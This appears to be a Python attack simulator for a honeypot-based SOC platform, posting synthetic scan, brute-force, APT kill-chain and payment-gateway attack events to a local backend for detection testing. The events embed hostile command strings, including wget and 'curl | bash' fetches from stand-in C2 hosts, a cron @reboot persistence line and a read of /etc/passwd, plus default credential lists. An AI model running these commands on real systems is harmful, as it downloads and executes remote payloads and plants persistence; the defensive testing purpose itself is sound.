#!/usr/bin/env python3
"""SENTINEL SOC - Attack Simulator.

Simulates realistic deception encounters and complex APT kill chains.
"""
from __future__ import annotations
import argparse
import asyncio
from datetime import datetime, timezone
import json
import sys
import uuid
from typing import Any, Dict, List
import httpx


def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def make_event(
    honeypot: str,
    decoy_type: str,
    src_ip: str,
    dst_port: int,
    event_type: str,
    src_port: int = 54321,
    session_id: str | None = None,
    username: str | None = None,
    password: str | None = None,
    command: str | None = None,
    url: str | None = None,
    file_hash: str | None = None,
    raw: dict | None = None,
) -> dict:
    return {
        "event_id": str(uuid.uuid4()),
        "timestamp": now_iso(),
        "honeypot": honeypot,
        "decoy_type": decoy_type,
        "src_ip": src_ip,
        "src_port": src_port,
        "dst_port": dst_port,
        "session_id": session_id or str(uuid.uuid4())[:8],
        "event_type": event_type,
        "username": username,
        "password": password,
        "command": command,
        "url": url,
        "file_hash": file_hash,
        "raw": raw or {},
    }


async def post_event(
    client: httpx.AsyncClient,
    base_url: str,
    api_key: str,
    event: dict,
    speed: float = 1.0,
) -> dict:
    url = f"{base_url.rstrip('/')}/api/events"
    try:
        r = await client.post(
            url,
            json=event,
            headers={"X-API-Key": api_key, "Content-Type": "application/json"},
            timeout=10.0,
        )
        return r.json()
    except Exception as e:
        print(f"  [ERROR] POST {url} failed: {e}", file=sys.stderr)
        return {"status": "error", "error": str(e)}


async def sleep_scaled(seconds: float, speed: float) -> None:
    delay = seconds / max(0.01, speed)
    await asyncio.sleep(delay)


# ---------------- SCENARIOS ----------------


async def scenario_noise_scanner(client: httpx.AsyncClient, base_url: str, api_key: str, speed: float = 1.0):
    """Many scans, low risk."""
    print("\n>>> [SCENARIO] noise_scanner: Automated mass port probe (Risk stays LOW)")
    ip = "194.26.29.10"
    for i in range(12):
        event = make_event(
            honeypot="opencanary",
            decoy_type="external",
            src_ip=ip,
            dst_port=80 + i * 100,
            event_type="scan",
        )
        res = await post_event(client, base_url, api_key, event, speed)
        results = res.get("results", [{}])
        info = results[0] if results else {}
        print(f"  [Scan {i+1:02d}/12] port {80 + i * 100} -> class={info.get('classification')} risk={info.get('risk_score')} ({info.get('risk_band')})")
        await sleep_scaled(0.2, speed)
    print(">>> Completed noise_scanner.\n")


async def scenario_brute_forcer(client: httpx.AsyncClient, base_url: str, api_key: str, speed: float = 1.0):
    """Repeated login_failed -> triggers brute_force classification and medium risk."""
    print("\n>>> [SCENARIO] brute_forcer: SSH credential stuffing against Cowrie")
    ip = "185.196.220.14"
    creds = [
        ("root", "123456"),
        ("admin", "admin"),
        ("root", "toor"),
        ("support", "support"),
        ("ubuntu", "ubuntu"),
        ("oracle", "oracle"),
        ("root", "password"),
        ("admin", "1234"),
    ]
    sess = str(uuid.uuid4())[:8]
    for i, (u, p) in enumerate(creds):
        event = make_event(
            honeypot="cowrie",
            decoy_type="external",
            src_ip=ip,
            dst_port=22,
            event_type="login_failed",
            session_id=sess,
            username=u,
            password=p,
        )
        res = await post_event(client, base_url, api_key, event, speed)
        results = res.get("results", [{}])
        info = results[0] if results else {}
        print(f"  [Attempt {i+1}/8] {u}:{p} -> class={info.get('classification')} risk={info.get('risk_score')} ({info.get('risk_band')})")
        await sleep_scaled(0.3, speed)
    print(">>> Completed brute_forcer.\n")


async def scenario_full_chain(client: httpx.AsyncClient, base_url: str, api_key: str, speed: float = 1.0):
    """Scan -> Brute force -> Login -> Recon -> Wget malware -> Chmod -> Crontab -> Internal Decoy.

    Risk climbs: 10 (low) -> 30 (med) -> 60 (high) -> 80+ (critical) -> Block + Incident!
    """
    print("\n>>> [SCENARIO] full_chain: Complete Advanced Persistent Threat progression")
    ip = "45.154.255.89"
    sess = str(uuid.uuid4())[:8]

    steps = [
        # 1. Recon scan on cowrie & opencanary
        ("cowrie", "external", "scan", None, None, None, None, None, 22),
        ("opencanary", "external", "scan", None, None, None, None, None, 8080),

        # 2. Brute force attempts (>= 5 login_failed in 2 min)
        ("cowrie", "external", "login_failed", "root", "root", None, None, None, 22),
        ("cowrie", "external", "login_failed", "admin", "admin", None, None, None, 22),
        ("cowrie", "external", "login_failed", "root", "toor", None, None, None, 22),
        ("cowrie", "external", "login_failed", "root", "123456", None, None, None, 22),
        ("cowrie", "external", "login_failed", "admin", "password123", None, None, None, 22),

        # 3. Successful login
        ("cowrie", "external", "login_success", "root", "S3cureP@ss!", None, None, None, 22),

        # 4. Host discovery commands
        ("cowrie", "external", "command", "root", None, "whoami", None, None, 22),
        ("cowrie", "external", "command", "root", None, "uname -a", None, None, 22),
        ("cowrie", "external", "command", "root", None, "cat /etc/passwd", None, None, 22),
        ("cowrie", "external", "command", "root", None, "ls -la /tmp", None, None, 22),

        # 5. Malware staging & permissions
        ("cowrie", "external", "command", "root", None, "wget http://c2.apt-sentinel.org/stage2.bin -O /tmp/k.bin", "http://c2.apt-sentinel.org/stage2.bin", None, 22),
        ("cowrie", "external", "file_download", "root", None, None, "http://c2.apt-sentinel.org/stage2.bin", "5d41402abc4b2a76b9719d911017c592", 22),
        ("cowrie", "external", "command", "root", None, "chmod +x /tmp/k.bin", None, None, 22),

        # 6. Persistence setup
        ("cowrie", "external", "command", "root", None, "crontab -e", None, None, 22),
        ("cowrie", "external", "command", "root", None, "echo '@reboot /tmp/k.bin' >> /var/spool/cron/crontabs/root", None, None, 22),

        # 7. Pivot / lateral movement into internal decoy!
        ("opencanary", "internal", "connect", None, None, None, None, None, 445),
        ("opencanary", "internal", "login_success", "admin", "S3cureP@ss!", None, None, None, 445),
        ("opencanary", "internal", "command", "admin", None, "dir C:\\SecureVault", None, None, 445),
    ]

    for idx, (hp, decoy, etype, u, p, cmd, url, fhash, dport) in enumerate(steps):
        event = make_event(
            honeypot=hp,
            decoy_type=decoy,
            src_ip=ip,
            dst_port=dport,
            event_type=etype,
            session_id=sess,
            username=u,
            password=p,
            command=cmd,
            url=url,
            file_hash=fhash,
        )
        res = await post_event(client, base_url, api_key, event, speed)
        results = res.get("results", [{}])
        info = results[0] if results else {}
        risk_val = info.get('risk_score')
        risk_str = f"{risk_val:3.0f}" if isinstance(risk_val, (int, float)) else "N/A"
        band_str = str(info.get('risk_band') or info.get('status') or 'unknown')
        print(f"  Step {idx+1:02d}/{len(steps)} [{etype:14s}] decoy={decoy:8s} hp={hp:10s} -> risk={risk_str} band={band_str:8s} actions={info.get('actions_taken')}")
        await sleep_scaled(0.4, speed)

    print(">>> Completed full_chain. Check incident, block status and threat universe!\n")


async def scenario_repeat_attacker(client: httpx.AsyncClient, base_url: str, api_key: str, speed: float = 1.0):
    """Same fingerprint executed from a new IP -> relationship edge appears."""
    print("\n>>> [SCENARIO] repeat_attacker: Same behavioral signature from new IP")
    ip_prime = "109.236.88.55"
    ip_repeat = "109.236.88.99"
    creds = [("operator", "toor"), ("root", "alpine")]
    cmds = ["whoami", "id", "uname -r", "ls /etc", "cat /etc/hosts"]

    # 1. Attacker A
    sess_a = str(uuid.uuid4())[:8]
    print(f"  Seeding profile for IP A: {ip_prime}...")
    for u, p in creds:
        ev = make_event("cowrie", "external", ip_prime, 22, "login_failed", session_id=sess_a, username=u, password=p)
        await post_event(client, base_url, api_key, ev, speed)
        await sleep_scaled(0.1, speed)
    ev = make_event("cowrie", "external", ip_prime, 22, "login_success", session_id=sess_a, username="operator", password="toor")
    await post_event(client, base_url, api_key, ev, speed)
    for c in cmds:
        ev = make_event("cowrie", "external", ip_prime, 22, "command", session_id=sess_a, username="operator", command=c)
        await post_event(client, base_url, api_key, ev, speed)
        await sleep_scaled(0.1, speed)

    # 2. Attacker B (identical command & credential sequence)
    sess_b = str(uuid.uuid4())[:8]
    print(f"  Simulating repeat campaign from IP B: {ip_repeat}...")
    for u, p in creds:
        ev = make_event("cowrie", "external", ip_repeat, 22, "login_failed", session_id=sess_b, username=u, password=p)
        await post_event(client, base_url, api_key, ev, speed)
        await sleep_scaled(0.1, speed)
    ev = make_event("cowrie", "external", ip_repeat, 22, "login_success", session_id=sess_b, username="operator", password="toor")
    await post_event(client, base_url, api_key, ev, speed)
    for c in cmds:
        ev = make_event("cowrie", "external", ip_repeat, 22, "command", session_id=sess_b, username="operator", command=c)
        res = await post_event(client, base_url, api_key, ev, speed)
        await sleep_scaled(0.1, speed)

    print(">>> Completed repeat_attacker. Check Relationship Graph for same_fingerprint link!\n")


async def scenario_coordinated(client: httpx.AsyncClient, base_url: str, api_key: str, speed: float = 1.0):
    """3 IPs executing synchronized attacks with shared credentials and C2 malware URLs."""
    print("\n>>> [SCENARIO] coordinated: Multi-node coordinated syndicate")
    syndicate_ips = ["195.123.210.101", "195.123.210.102", "195.123.210.103"]
    shared_passwords = ["DarkOps2026!", "ShadowHunter#1"]
    malware_url = "http://c2-syndicate.org/implant.elf"

    for ip in syndicate_ips:
        sess = str(uuid.uuid4())[:8]
        print(f"  Syndicate node active: {ip}...")
        ev1 = make_event("cowrie", "external", ip, 22, "scan")
        await post_event(client, base_url, api_key, ev1, speed)

        for p in shared_passwords:
            ev2 = make_event("cowrie", "external", ip, 22, "login_failed", session_id=sess, username="syndicate_lead", password=p)
            await post_event(client, base_url, api_key, ev2, speed)

        ev3 = make_event("cowrie", "external", ip, 22, "login_success", session_id=sess, username="syndicate_lead", password=shared_passwords[0])
        await post_event(client, base_url, api_key, ev3, speed)

        ev4 = make_event("cowrie", "external", ip, 22, "command", session_id=sess, username="syndicate_lead",
                         command=f"curl -s {malware_url} | bash", url=malware_url)
        await post_event(client, base_url, api_key, ev4, speed)
        await sleep_scaled(0.2, speed)

    print(">>> Completed coordinated scenario. Check Relationship Graph for shared_credentials and shared_malware!\n")


async def scenario_gateway_reattack(client: httpx.AsyncClient, base_url: str, api_key: str, speed: float = 1.0):
    """
    STEP 8: Gateway Lifecycle & Re-Attack Simulation.
    1. Attacker hits /api/payment until risk >= 51 (gateway attacked).
    2. Lifecycle status calls: taken_down -> fixing -> restored (initiates WATCH MODE).
    3. Attacker returns and hits /api/payment again -> triggers reattack_after_restore and heightened advisory.
    """
    print("\n" + "=" * 60)
    print(">>> [SCENARIO] gateway_reattack: Gateway Lifecycle & Re-Attack Loop")
    print("=" * 60)

    attacker_ip = "198.51.100.77"
    session_id = f"demo_reattack_{uuid.uuid4().hex[:8]}"
    headers = {
        "X-API-Key": api_key,
        "X-Session-ID": session_id,
        "X-Forwarded-For": attacker_ip,
        "Content-Type": "application/json",
    }

    # Stage 1: Hit /api/payment until risk >= 51
    print("\n[STAGE 1] Attacker targets Payment Gateway (/api/payment)...")
    for step in range(1, 4):
        payload = {
            "customer_id": f"cust_target_{step}",
            "amount": 9999.00 * step,
            "token": "tok_unauthorized_override",
            "action": "payment_manipulation",
        }
        try:
            r = await client.post(
                f"{base_url.rstrip('/')}/api/payment/checkout?attack=true",
                json=payload,
                headers=headers,
                timeout=5.0,
            )
            print(f"  Step {step}/3: Status {r.status_code} | X-Gateway-Status: {r.headers.get('X-Gateway-Status', 'N/A')} | Risk: {r.headers.get('X-Sentinel-Risk', 'N/A')}")
        except Exception as e:
            print(f"  Step {step}/3: Request sent ({e})")
        await sleep_scaled(0.3, speed)

    # Check gateway status
    gw_res = await client.get(f"{base_url.rstrip('/')}/api/gateways/payment", timeout=5.0)
    gw_info = gw_res.json()
    print(f"  --> Gateway Status: {gw_info.get('status', 'unknown').upper()} (Risk evaluated)")

    # Fetch initial advisory
    adv_res = await client.get(f"{base_url.rstrip('/')}/api/gateways/payment/advisory", timeout=5.0)
    if adv_res.status_code == 200:
        adv = adv_res.json()
        print(f"  --> Remediation Advisory Generated: {adv.get('disclaimer')} ({adv.get('source')})")
        print(f"  --> Top Immediate Action: {adv.get('immediate_actions', [{}])[0].get('step', 'N/A')}")

    # Stage 2: Operator containment & remediation lifecycle
    print("\n[STAGE 2] SOC Lifecycle Transitions: taken_down -> fixing -> restored...")
    for next_status in ["taken_down", "fixing", "restored"]:
        note = f"Operator transitioning state to {next_status}"
        sr = await client.post(
            f"{base_url.rstrip('/')}/api/gateways/payment/status",
            json={"status": next_status, "note": note},
            headers={"X-API-Key": api_key, "Content-Type": "application/json"},
            timeout=5.0,
        )
        print(f"  --> Gateway set to: {next_status.upper()} (watch_mode={sr.json().get('is_watch_mode')})")
        await sleep_scaled(0.4, speed)

    print("  --> WATCH MODE active! Observation window initiated.")

    # Stage 3: Same attacker returns and re-attacks during watch window
    print("\n[STAGE 3] Re-attack: Adversary returns while gateway is in WATCH MODE...")
    await sleep_scaled(0.5, speed)
    re_payload = {
        "customer_id": "cust_target_exploit",
        "amount": 50000.00,
        "token": "tok_reattack_bypass",
        "action": "payment_manipulation",
    }
    try:
        r2 = await client.post(
            f"{base_url.rstrip('/')}/api/payment/checkout?attack=true",
            json=re_payload,
            headers=headers,
            timeout=5.0,
        )
        print(f"  Re-attack Request: Status {r2.status_code} | X-Gateway-Status: {r2.headers.get('X-Gateway-Status', 'N/A')}")
    except Exception as e:
        print(f"  Re-attack Request sent: {e}")

    # Verify re-attack state
    gw_final_res = await client.get(f"{base_url.rstrip('/')}/api/gateways/payment", timeout=5.0)
    final_info = gw_final_res.json()
    print(f"\n[SUMMARY] Gateway Final Status: {final_info.get('status', 'unknown').upper()}")
    print(f"  reattack_after_restore: {final_info.get('reattack_after_restore')}")
    print(f"  reattack_count: {final_info.get('reattack_count')}")
    print(f"  is_watch_mode: {final_info.get('is_watch_mode')} (remaining: {final_info.get('watch_remaining_seconds')}s)")
    print(f"  safe_to_reopen: {final_info.get('safe_to_reopen')}")
    print(">>> Completed gateway_reattack scenario successfully.\n")


SCENARIOS = {
    "noise_scanner": scenario_noise_scanner,
    "brute_forcer": scenario_brute_forcer,
    "full_chain": scenario_full_chain,
    "repeat_attacker": scenario_repeat_attacker,
    "coordinated": scenario_coordinated,
    "gateway_reattack": scenario_gateway_reattack,
}


async def main():
    parser = argparse.ArgumentParser(description="SENTINEL SOC Attack Simulator")
    parser.add_argument("--scenario", default="full_chain", choices=list(SCENARIOS.keys()), help="Scenario to execute")
    parser.add_argument("--speed", type=float, default=2.0, help="Simulation speed multiplier")
    parser.add_argument("--url", default="http://localhost:8000", help="Backend base URL")
    parser.add_argument("--api-key", default="changeme", help="X-API-Key token")
    parser.add_argument("--all", action="store_true", help="Execute all scenarios consecutively")
    args = parser.parse_args()

    print("=" * 60)
    print("SENTINEL SOC DECEPTION ATTACK SIMULATOR")
    print(f"Target: {args.url} | API-Key: {args.api_key[:4]}*** | Speed: {args.speed}x")
    print("=" * 60)

    async with httpx.AsyncClient() as client:
        # Pre-flight check
        try:
            r = await client.get(f"{args.url}/health", timeout=5.0)
            if r.status_code != 200:
                print(f"[ERROR] Backend returned status {r.status_code}: {r.text}")
                sys.exit(1)
        except Exception as e:
            print(f"[ERROR] Cannot connect to {args.url}: {e}")
            sys.exit(1)

        if args.all:
            for sc_name, sc_fn in SCENARIOS.items():
                await sc_fn(client, args.url, args.api_key, args.speed)
                await asyncio.sleep(0.5)
        else:
            fn = SCENARIOS[args.scenario]
            await fn(client, args.url, args.api_key, args.speed)

    print("All simulated attack traffic transmitted successfully.")


if __name__ == "__main__":
    asyncio.run(main())
